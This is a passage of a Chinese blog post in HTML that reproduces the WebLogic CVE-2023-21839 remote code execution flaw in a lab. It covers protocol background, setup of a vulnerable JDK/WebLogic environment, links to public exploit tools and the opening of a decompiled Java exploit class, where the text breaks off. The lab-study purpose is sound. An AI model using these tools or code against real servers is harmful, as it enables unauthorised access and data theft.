href=\"https://baike.baidu.com/item/%E4%B8%AD%E9%97%B4%E4%BB%B6/452240?fromModule=lemma_inlink\">中间件</a>，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、<a href=\"https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/2196523?fromModule=lemma_inlink\">网络应用</a>和<a href=\"https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8/10563731?fromModule=lemma_inlink\">数据库应用</a>的<a href=\"https://baike.baidu.com/item/Java/85979?fromModule=lemma_inlink\">Java</a>应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p></blockquote>\n<h4 id=\"T3的概念和交互过程\"><a href=\"#T3的概念和交互过程\" class=\"headerlink\" title=\"T3的概念和交互过程\"></a>T3的概念和交互过程</h4><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>T3也称为丰富套接字，是BEA内部协议，功能丰富，可扩展性好。T3是多工双向和异步协议，经过高度优化，只使用一个套接字和一条线程。借助这种方法，基于Java的客户端可以根据服务器方需求使用多种<code>RMI</code>对象，但仍使用一个套接字和一条线程。这也为我们静态分析t3协议带来了很多麻烦</p>\n<p>RMI在log4j中提到，它是一个调用远程类的一个Java的方法</p></blockquote>\n<p><strong>交互方式</strong></p>\n<p><img src=\"/post/CVE-Test/image-20230226152124965.png\" alt=\"image-20230226152124965\"></p>\n<h4 id=\"iiop概念\"><a href=\"#iiop概念\" class=\"headerlink\" title=\"iiop概念\"></a>iiop概念</h4><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>用来在CORBA<a href=\"https://baike.baidu.com/item/%E5%AF%B9%E8%B1%A1%E8%AF%B7%E6%B1%82%E4%BB%A3%E7%90%86?fromModule=lemma_inlink\">对象请求代理</a>之间交流的协议。Java中使得程序可以和其他语言的CORBA实现<a href=\"https://baike.baidu.com/item/%E4%BA%92%E6%93%8D%E4%BD%9C%E6%80%A7?fromModule=lemma_inlink\">互操作性</a>的协议。</p>\n<p>这个协议的最初阶段是要建立以下几个组件部分：一个IIOP到HTTP的<a href=\"https://baike.baidu.com/item/%E7%BD%91%E5%85%B3?fromModule=lemma_inlink\">网关</a>，使用这个网关可以让CORBA客户访问WWW资源；一个HTTP到IIOP的网关，通过这个网关可以访问CORBA资源；一个为IIOP和HTTP提供资源的服务器，一个能够将IIOP作为可识别协议的浏览器。</p></blockquote>\n<h4 id=\"什么是CORBA\"><a href=\"#什么是CORBA\" class=\"headerlink\" title=\"什么是CORBA\"></a>什么是CORBA</h4><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>CORBA（Common ObjectRequest Broker Architecture公共对象请求代理体系结构）是由<a href=\"https://baike.baidu.com/item/OMG/3041465?fromModule=lemma_inlink\">OMG</a>组织制订的一种标准的<a href=\"https://baike.baidu.com/item/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/2262089?fromModule=lemma_inlink\">面向对象</a>应用程序体系规范。或者说CORBA体系结构是对象管理组织（OMG）为解决<a href=\"https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F%E5%A4%84%E7%90%86/3352171?fromModule=lemma_inlink\">分布式处理</a>环境(DCE)中，硬件和软件系统的互连而提出的一种解决方案；OMG组织是一个国际性的<a href=\"https://baike.baidu.com/item/%E9%9D%9E%E7%9B%88%E5%88%A9%E7%BB%84%E7%BB%87/5622954?fromModule=lemma_inlink\">非盈利组织</a>，其职责是为<a href=\"https://baike.baidu.com/item/%E5%BA%94%E7%94%A8/3994271?fromModule=lemma_inlink\">应用</a>开发提供一个公共框架，制订工业指南和对象管理规范，加快对象技术的发展。</p></blockquote>\n<h2 id=\"环境搭建-2\"><a href=\"#环境搭建-2\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p>从官网下载<code>Weblogic 12.2.1.3.0</code></p>\n<p><img src=\"/post/CVE-Test/image-20230226141556869.png\" alt=\"image-20230226141556869\"></p>\n<p>然后解压其中的jar包，然后到<code>/disk1/install</code>下执行cmd脚本就行</p>\n<p>但是需要注意，由于<code>Weblogic</code>中的<code>maven</code>的存在，其识别<code>jdk</code>时，只针对环境变量名<code>JAVA_HOME</code>的路径进行识别，而如果是在PATH中配置的，会报错找不到<code>java</code>环境的位置</p>\n<pre><code>ERROR: Cannot determine the Java Home ERROR: Specify the -jreLoc option\n</code></pre>\n<p><img src=\"/post/CVE-Test/image-20230226142921961.png\" alt=\"image-20230226142921961\"></p>\n<p>然后再次管理员执行时发现失败，查看报错日志</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>java.lang.NullPointerException: Cannot invoke “java.lang.<strong><code>reflect.Method</code></strong>.invoke(Object, Object[])” because “com.sun.<code>xml.bind</code>.v2.runtime.reflect.opt.Injector.defineClass” <strong><code>is null</code></strong>[[</p></blockquote>\n<p>猜测应该是我的<code>java</code>自身的问题</p>\n<p>从<code>stack</code>中了解到了，在<code>java9</code>的时候，<code>JAXB</code>（Java Architecture for XML Binding）<code>[java映射为xml的表示方式]</code> </p>\n<p>在<code>java9</code>已经被标记为弃用，在<code>java11</code>的时候已经被删除，所以需要换到低版本的<code>java</code>或者在依赖项添加<code>xml</code>库，让其重新映射</p>\n<p><a href=\"https://javaalmanac.io/jdk/11/apidiff/9/\">New APIs in Java 11 - javaalmanac.io</a></p>\n<pre class=\" language-xml\"><code class=\"language-xml\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>com.sun.xml.bind<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>jaxb-impl<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>2.3.1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>com.sun.xml.messaging.saaj<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>saaj-impl<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>1.5.1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span>\n</code></pre>\n<p>【建议下载jdk8低版本最方便，记得再次修改JAVA_HOME环境变量】</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注意，这个和log4j的原因一样，是加载远程恶意类导致远程命令的执行，所以对java是否开启加载远程类，也就是要注意对应的版本</p>\n<p>版本≤ <code>JDK 6u211、7u201、 8u191、11.0.1</code></p>\n<p>所以我这里复现的环境和apache的log4j2一样，是<code>JDK-8u171</code></p></blockquote>\n<p>安装搭建按流程按引导</p>\n<pre><code>http://localhost:7001/console\n</code></pre>\n<p><img src=\"/post/CVE-Test/image-20230226165115723.png\" alt=\"image-20230226165115723\"></p>\n<h2 id=\"渗透流程\"><a href=\"#渗透流程\" class=\"headerlink\" title=\"渗透流程\"></a>渗透流程</h2><p>这是2023年一月的洞，我是二月复现的，目前大致就两种payload工具，一个<code>java</code>的，一个<code>go</code></p>\n<p>仔细分析一下漏洞的利用条件和形成原因，以及两个工具的脚本的原理</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>go的<a href=\"https://github.com/4ra1n/CVE-2023-21839\">4ra1n&#x2F;CVE-2023-21839: Weblogic CVE-2023-21839 RCE (无需Java依赖一键RCE) (github.com)</a></p>\n<p>java的<a href=\"https://github.com/DXask88MA/Weblogic-CVE-2023-21839\">DXask88MA&#x2F;Weblogic-CVE-2023-21839 (github.com)</a></p></blockquote>\n<p>两者大差不差，但是个人感觉go更舒服一些</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>在公网上，IIOP协议和NAT转换之间存在冲突的网络问题，</p>\n<p>一般只能修改源码或者尝试<strong>iiop协议net绕过</strong><a href=\"https://xz.aliyun.com/t/8508\">Weblogic IIOP 协议NAT 网络绕过 - 先知社区 (aliyun.com)</a></p>\n<p>【冲突原因学习记在keynotes上，大致就是两者之间的ip指向和ip转换冲突，一个根据自身规则发送数据到私网ip，另一个根据自身规则把私网ip又变为公网ip，从而通讯连接失败】</p>\n<p>用go进行重写iiop的一些协议，从而避免在对公网或者docker进行操作的时候出现连接网络错误，当然java也是可以修改iiop规则的，视情况和能力而定</p></blockquote>\n<h3 id=\"远程代码执行原理\"><a href=\"#远程代码执行原理\" class=\"headerlink\" title=\"远程代码执行原理\"></a>远程代码执行原理</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>利用该漏洞允许未经身份验证的攻击者通过 <code>T3、IIOP</code> 进行网络访问，从而危害 Oracle WebLogic Server。成功攻击此漏洞可导致未经授权访问<code>关键数据或完全访问所有 Oracle WebLogic Server 可访问数据</code>。</p></blockquote>\n<h3 id=\"JAVA\"><a href=\"#JAVA\" class=\"headerlink\" title=\"JAVA\"></a>JAVA</h3><p>（不好的就是需要对应java版本跑，每个版本Java都要删去一些东西，还是go整洁的包舒服）</p>\n<pre class=\" language-java\"><code class=\"language-java\"><span class=\"token comment\" spellcheck=\"true\">//</span>\n<span class=\"token comment\" spellcheck=\"true\">// Source code recreated from a .class file by IntelliJ IDEA</span>\n<span class=\"token comment\" spellcheck=\"true\">// (powered by FernFlower decompiler)</span>\n<span class=\"token comment\" spellcheck=\"true\">//</span>\n\n<span class=\"token keyword\">import</span> java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span>Field<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span>Hashtable<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span>Random<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> javax<span class=\"token punctuation\">.</span>naming<span class=\"token punctuation\">.</span>InitialContext<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> javax<span class=\"token punctuation\">.</span>naming<span class=\"token punctuation\">.</span>NamingException<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> weblogic<span class=\"token punctuation\">.</span>deployment<span class=\"token punctuation\">.</span>jms<span class=\"token punctuation\">.</span>ForeignOpaqueReference<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">CVE_2023_21839</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">static</span> String JNDI_FACTORY <span class=\"token operator\">=</span> <span class=\"token 